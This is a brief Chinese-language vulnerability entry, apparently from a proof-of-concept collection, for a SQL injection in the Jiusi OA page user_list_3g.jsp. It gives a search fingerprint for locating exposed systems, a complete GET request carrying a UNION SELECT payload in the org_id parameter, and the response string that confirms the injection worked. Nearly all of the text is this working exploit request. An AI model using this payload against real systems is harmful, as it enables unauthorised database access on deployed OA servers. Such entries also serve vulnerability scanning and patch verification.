# 九思OAuser_list_3g.jspSQL注入漏洞

九思OAuser_list_3g.jsp ｜ SQL注入 ｜ —
- **指纹**：`app="九思软件-OA"`
- **请求**：`GET /jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5(1)%20%23 HTTP/1.1`
- **响应特征**：200 b923820dcc